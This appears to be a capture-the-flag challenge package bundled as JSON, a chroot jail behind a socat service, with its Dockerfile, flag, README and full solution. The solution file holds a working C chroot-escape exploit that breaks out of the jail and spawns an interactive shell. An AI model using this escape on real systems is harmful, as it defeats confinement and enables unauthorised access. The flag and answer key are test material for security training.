{
    "Dockerfile": "FROM alpine\n\nRUN apk --no-cache add socat\n\nENV chroot_dir=/pwn/jail\nENV arch=x86_64\nENV mirror=http://mirror.math.princeton.edu/pub/alpinelinux/\nENV version=2.10.4-r3\n\nWORKDIR ${chroot_dir}\n\nRUN wget ${mirror}/latest-stable/main/${arch}/apk-tools-static-${version}.apk\nRUN tar -xzf apk-tools-static-*.apk\nRUN rm apk-tools-static-*.apk\nRUN ./sbin/apk.static -X ${mirror}/latest-stable/main -U --allow-untrusted --root ${chroot_dir} --initdb add alpine-base\n\nADD not-so-great-escape.sh /pwn/not-so-great-escape\nADD flag.txt /pwn\n\nENTRYPOINT [\"timeout\", \"900\", \"sh\", \"-c\", \"exec socat -d -d tcp-l:4353,reuseaddr,fork exec:/pwn/not-so-great-escape,pty,setsid,setpgid,stderr,ctty\"]\n",
    "flag.txt": "gigem{up_up_&_a_way_0u7}\n",
    "not-so-great-escape.sh": "#!/bin/sh\n\nchroot_dir=$(mktemp -d)\n\nfunction cleanup {\n  rm -rf ${chroot_dir}\n}\ntrap cleanup EXIT\n\nread -sp \"Password: \" password\necho\n\nif [[ -z \"${password}\" || \"2ff6b0b9733a294cb0e0aeb7269dea5ae05d2a2de569e8464b5967c6c207548e\" != \"${password}\" ]]; then\n  echo -e \"Bad password. Exiting.\"\n  exit 1\nfi\n\ncp -r /pwn/jail/* ${chroot_dir}\n\ncp /etc/apk/repositories ${chroot_dir}/etc/apk/repositories\ncp /etc/resolv.conf ${chroot_dir}/etc/resolv.conf\n\nchroot ${chroot_dir}\n",
    "README.md": "# Not So Great Escape\n\n```text\nWe've set up a chroot for you to develop your musl code in. It's bare, so install whatever you need.\n\nFeel free to log in with: socat -,raw,echo=0 tcp:172.17.0.2:4353\nThe password is \"2ff6b0b9733a294cb0e0aeb7269dea5ae05d2a2de569e8464b5967c6c207548e\".\n```\n\n## Setup\n\n1. `docker build -t not-so-great-escape .`\n2. `docker run --rm -ti --read-only --tmpfs /tmp:exec not-so-great-escape`\n\nYou MUST run this with all the flags listed!\n\n## Brief Dev Description\n\nEasy chroot escape. Have fun. :)\n\n## Solution\n\nYou can copy/paste the contents of solution.bin into the terminal after connecting.\n",
    "solution.bin": "2ff6b0b9733a294cb0e0aeb7269dea5ae05d2a2de569e8464b5967c6c207548e\napk add gcc musl-dev\ncat << EOF > exploit.c\n#include <unistd.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n\nvoid die(char *msg) {\n\tperror(msg);\n\texit(1);\n}\n\nint main(int argc, char *argv[])\n{\n\tint i;\n\t\n\tif (chdir(\"/\") != 0)\n\t\tdie(\"chdir(/)\");\n\t\n\tif (mkdir(\"baz\", 0777) != 0)\n\t\tdie(\"mkdir(baz)\");\n\t\n\tif (chroot(\"baz\") != 0)\n\t\tdie(\"chroot(baz)\");\n\t\n\tfor (i=0; i<50; i++) {\n\t\tif (chdir(\"..\") != 0)\n\t\t\tdie(\"chdir(..)\");\n\t}\n\t\n\tif (chroot(\".\") != 0)\n\t\tdie(\"chroot(.)\");\n\t\n\tprintf(\"Exploit seems to work. =)\\n\");\n\t\n\texecl(\"/bin/sh\", \"sh\", \"-i\", (char *)0);\n\tdie(\"exec sh\");\n\t\n\texit(0);\n}\nEOF\ngcc exploit.c\n./a.out\ncat /pwn/flag.txt\n",
    "category": "Misc"
}